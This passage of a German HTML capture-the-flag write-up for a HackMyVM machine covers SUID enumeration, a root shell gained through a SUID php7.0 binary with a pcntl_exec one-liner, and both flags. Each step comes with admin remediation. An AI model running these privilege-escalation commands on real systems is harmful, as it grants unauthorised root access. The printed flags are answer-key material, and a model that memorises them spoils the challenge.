+                `ls -la /var/backups/` listet den Inhalt des Verzeichnisses `/var/backups` auf. Dieses Verzeichnis wird oft von Systemdiensten verwendet, um Sicherungskopien von Konfigurationsdateien oder Datenbanken abzulegen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das Verzeichnis `/var/backups` ist leer oder enthält keine für `www-data` sichtbaren Backup-Dateien. Backups können oft sensible Informationen enthalten und sind daher ein interessantes Ziel, aber hier gibt es nichts zu finden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Auch wenn dieses Verzeichnis leer ist, suchen Sie weiter nach Backup-Skripten oder Konfigurationen, die auf andere Speicherorte für Backups hinweisen könnten.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass Backups an einem sicheren Ort gespeichert und die Berechtigungen für das Backup-Verzeichnis und die Dateien restriktiv sind. Sensible Daten in Backups sollten verschlüsselt werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+      815     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 <span class="command">/snap/core20/1828/usr/bin/chfn</span>
+      821     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 <span class="command">/snap/core20/1828/usr/bin/chsh</span>
+      890     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 <span class="command">/snap/core20/1828/usr/bin/gpasswd</span>
+      974     55 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 <span class="command">/snap/core20/1828/usr/bin/mount</span>
+      983     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 <span class="command">/snap/core20/1828/usr/bin/newgrp</span>
+      998     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 <span class="command">/snap/core20/1828/usr/bin/passwd</span>
+     1108     67 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 <span class="command">/snap/core20/1828/usr/bin/su</span>
+     1109    163 -rwsr-xr-x   1 root     root       166056 Jan 16  2023 <span class="command">/snap/core20/1828/usr/bin/sudo</span>
+     1167     39 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 <span class="command">/snap/core20/1828/usr/bin/umount</span>
+     1256     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 <span class="command">/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+     1628    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 <span class="command">/snap/core20/1828/usr/lib/openssh/ssh-keysign</span>
+      139    121 -rwsr-xr-x   1 root     root              123560 Jan 25  2023 <span class="command">/snap/snapd/18357/usr/lib/snapd/snap-confine</span>
+   132438     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 <span class="command">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   132653     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 <span class="command">/usr/lib/policykit-1/polkit-agent-helper-1</span>
+   182372    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 <span class="command">/usr/lib/openssh/ssh-keysign</span>
+   158584    144 -rwsr-xr-x   1 root     root              146888 May 29  2023 <span class="command">/usr/lib/snapd/snap-confine</span>
+   132445     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 <span class="command">/usr/lib/eject/dmcrypt-get-device</span>
+   131559     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 <span class="command">/usr/bin/at</span>
+   132263    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 <span class="command">/usr/bin/sudo</span>
+   132235     40 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 <span class="command">/usr/bin/umount</span>
+   131891     56 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 <span class="command">/usr/bin/mount</span>
+   131633     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 <span class="command">/usr/bin/chsh</span>
+   132163     68 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 <span class="command">/usr/bin/su</span>
+   131627     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 <span class="command">/usr/bin/chfn</span>
+   131756     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 <span class="command">/usr/bin/gpasswd</span>
+   <span class="password">151439   4432 -rwsr-xr-x   1 root     root             4537352 Sep  2  2023 /usr/bin/php7.0</span>
+   131905     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 <span class="command">/usr/bin/newgrp</span>
+   131959     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 <span class="command">/usr/bin/pkexec</span>
+   131938     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 <span class="command">/usr/bin/passwd</span>
+   131740     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 <span class="command">/usr/bin/fusermount</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` sucht im gesamten Dateisystem (`/`) nach regulären Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit bewirkt, dass ein ausführbares Programm mit den Rechten des Dateibesitzers (oft `root`) ausgeführt wird, anstatt mit den Rechten des Benutzers, der es aufruft. Fehler (wie "Permission denied" für nicht lesbare Verzeichnisse) werden nach `/dev/null` umgeleitet, um die Ausgabe sauber zu halten. `-ls` gibt detaillierte Informationen zu den gefundenen Dateien aus.
+                Die Liste enthält viele Standard-SUID-Binaries wie `chfn`, `chsh`, `gpasswd`, `mount`, `newgrp`, `passwd`, `su`, `sudo`, `umount`, `pkexec`, `fusermount`, `at`, `ssh-keysign` etc.
+                Ein Eintrag sticht jedoch besonders hervor:
+                - `<span class="password">/usr/bin/php7.0</span>`: Dieses PHP-Binary hat das SUID-Bit gesetzt und gehört `root`. Das ist höchst ungewöhnlich und eine massive Sicherheitslücke!
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das SUID-Bit auf `/usr/bin/php7.0` ist ein kritischer Fund und ein sehr wahrscheinlicher Vektor für Privilege Escalation. Wenn ein PHP-Interpreter mit SUID-Root-Rechten ausgeführt werden kann, ist es oft trivial, Root-Rechte zu erlangen, indem man ein PHP-Skript ausführt, das Systembefehle oder Shells mit Root-Privilegien startet. Die anderen SUID-Binaries sind größtenteils Standard und, sofern sie nicht in einer verwundbaren Version vorliegen oder falsch konfiguriert sind, weniger wahrscheinlich für eine direkte Eskalation durch `www-data` nutzbar.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **Konzentrieren Sie sich auf `/usr/bin/php7.0`!**
+                - Versuchen Sie, PHP-Code auszuführen, der Ihnen Root-Rechte verschafft. Ein einfacher Befehl wie `/usr/bin/php7.0 -r 'pcntl_exec("/bin/bash", ["-p"]);'` oder `/usr/bin/php7.0 -r 'system("/bin/bash -p");'` könnte bereits eine Root-Shell liefern (das `-p` Flag bei Bash versucht, die effektive UID beizubehalten, was in diesem Fall Root wäre).
+                - Überprüfen Sie auch GTFOBins ([Link: https://gtfobins.github.io/ | Ziel: https://gtfobins.github.io/]) nach bekannten Methoden zur Ausnutzung von SUID-PHP.
+                <br>
+                **Empfehlung (Admin):**
+                - **Entfernen Sie sofort das SUID-Bit von `/usr/bin/php7.0`!** (`chmod u-s /usr/bin/php7.0`). Es gibt so gut wie keinen legitimen Grund, warum ein PHP-Interpreter SUID-Root sein sollte. Dies ist eine schwere Fehlkonfiguration.
+                - Überprüfen Sie das System auf andere Nicht-Standard-SUID/SGID-Binaries und hinterfragen Sie deren Notwendigkeit.
+                - Untersuchen Sie, warum und wie diese Berechtigung gesetzt wurde, um zukünftige Fehlkonfigurationen zu vermeiden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">php7.0 -r 'pcntl_exec("/bin/bash", ["-p"]);'</span></div>
+                    <pre>
+<span class="prompt">bash-5.0#</span> <span class="command">id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Hier wurde der entscheidende Befehl ausgeführt: `php7.0 -r 'pcntl_exec("/bin/bash", ["-p"]);'`
+                - `php7.0`: Ruft das SUID-PHP-Binary auf.
+                - `-r '...'`: Führt den PHP-Code direkt aus der Kommandozeile aus.
+                - `pcntl_exec("/bin/bash", ["-p"]);`: Die PHP-Funktion `pcntl_exec` ersetzt den aktuellen PHP-Prozess durch den angegebenen Befehl (`/bin/bash` mit dem Argument `-p`). Da `php7.0` mit SUID-Root-Rechten gestartet wurde, wird auch `/bin/bash -p` mit diesen Rechten (effektive UID=0) gestartet. Das `-p` Argument für Bash ist wichtig, da es versucht, die effektiven Rechte beizubehalten, anstatt sie auf die realen Rechte des aufrufenden Benutzers (`www-data`) zurückzusetzen.
+
+                Die Ausgabe ist eindeutig:
+                - Der Prompt ändert sich zu `bash-5.0#`, was oft ein Indikator für eine Root-Shell ist (das `#`-Symbol).
+                - Der anschließende `id`-Befehl bestätigt dies:
+                    - `uid=33(www-data)`: Die reale Benutzer-ID ist immer noch `www-data`.
+                    - `gid=33(www-data)`: Die reale Gruppen-ID ist immer noch `www-data`.
+                    - `euid=0(root)`: Die **effektive Benutzer-ID ist 0**, was `root` bedeutet!
+                    - `groups=33(www-data)`: Die Gruppenzugehörigkeiten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Volltreffer! Die Privilege Escalation war erfolgreich! Wir haben nun eine Shell mit effektiven Root-Rechten auf dem System. Die Kombination aus dem SUID-Bit auf `php7.0` und der Verwendung von `pcntl_exec` mit `/bin/bash -p` hat uns den vollständigen Root-Zugriff ermöglicht. Das Ziel des Penetrationstests, die höchsten Privilegien auf dem System zu erlangen, ist damit erreicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **Root-Flag lesen:** Suchen und lesen Sie die Root-Flag-Datei (oft in `/root/root.txt`).
+                - **User-Flag lesen:** Da wir nun Root sind, können wir auch die User-Flag lesen, falls noch nicht geschehen (z.B. in `/home/andrew/user.txt`).
+                - **Persistenz (optional, je nach Scope):** Richten Sie, falls im Scope erlaubt, einen Persistenzmechanismus ein (z.B. SSH-Key für Root, Cronjob).
+                - **Weitere Enumeration (optional):** Durchsuchen Sie das System nach weiteren sensiblen Daten, Konfigurationen oder Anzeichen für andere Schwachstellen aus der Root-Perspektive.
+                - Dokumentieren Sie den genauen Pfad zur Privilege Escalation.
+                <br>
+                **Empfehlung (Admin):**
+                - Wie bereits dringend empfohlen: **Entfernen Sie sofort das SUID-Bit von `/usr/bin/php7.0` (`chmod u-s /usr/bin/php7.0`).**
+                - Führen Sie ein vollständiges Systemaudit durch, um festzustellen, ob der Angreifer bereits Änderungen vorgenommen oder Backdoors hinterlassen hat.
+                - Überprüfen Sie alle SUID/SGID-Binaries auf dem System und entfernen Sie das Bit, wo es nicht absolut notwendig ist.
+                - Implementieren Sie Security Monitoring und Logging, um solche Aktivitäten zukünftig schneller zu erkennen.
+                - Schulen Sie Administratoren bezüglich sicherer Konfigurationen und der Gefahr von SUID-Binaries.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="code-block">
+                        <div class="terminal">
+                            <div class="prompt">bash-5.0# <span class="command">cd /home/andrew</span></div>
+                            <div class="prompt">bash-5.0# <span class="command">ls</span></div>
+                            <pre>
+snap
+<span class="command">user.txt</span>
+                            </pre>
+                            <div class="prompt">bash-5.0# <span class="command">cat user.txt</span></div>
+                            <pre>
+<span class="password">
+                                 _________
+                          _.--""'-----,   `"--.._
+                       .-''   _/_      ; .'"----,`-,
+                     .'      :___:     ; :      ;;`.`.
+                    .      _.- _.-    .' :      ::  `..
+                 __;..----------------' :: ___  ::   ;;
+            .--"". '           ___.....`:=(___)-' :--'`.
+          .'   .'         .--''__       :       ==:    ;
+      .--/    /        .'.''     ``-,   :         :   '`-.
+   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
+  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
+  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|    
+  : "  /\__/\____//   """      /     \\ :         :  : :|'||
+["""""""""--------........._  /      || ;      __.:--' :|//|
+ "------....______         ].'|      // |--"""'__...-'`\ \//
+   `|HMV{QUICK-user}|.--'": :  \    //  |---"""      \__\_/
+     """""""""'            \ \  \_.//  /
+       `---'                \ \_     _'
+                             `--`---'  
+</span>                             
+                            </pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="flag-entry">
+                    <div class="code-block">
+                        <div class="terminal">
+                             <div class="prompt">bash-5.0# <span class="command">cd /root</span></div>
+                             <div class="prompt">bash-5.0# <span class="command">ls</span></div>
+                             <pre>
+<span class="command">root.txt</span>
+snap
+                             </pre>
+                            <div class="prompt">bash-5.0# <span class="command">cat root.txt</span></div>
+                            <pre>
+<span class="password">
+            ___.............___
+         ,dMMMMMMMMMMMMMMMMMMMMMb.
+        dMMMMMMMMMMMMMMMMMMMMMMMMMb
+        |        | -_  - |        |
+        |        |_______|___     |
+        |     ___......./'.__`\   |
+        |_.-~"               `"~-.|
+        7\         _...._        |`.
+       /  l     .-'      `-.     j  \
+      :   .qp. / __________ \ .qp.   :
+      |  d8888b |          | d8888b  |
+  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
+ /     : /,------------------------.:    \
+:      |`.    | | [_FLAG_] ||     ,'|     :
+`\.____|  `.  : `.________.'|   ,'  |____.'
+  MMMMM|   |  |`-.________.-|  /    |MMMMM 
+ .-------------`------------'-'-----|-----.
+(___HMV{6ff5f1b9238a96b3c3871c67a215ec80}__)
+  MMMMMM                            MMMMMM 
+  `MMMM'                            `MMMM'
+</span>
+                            </pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 31. Mai 2025</p>
+    </footer>
+</body>
+</html> 
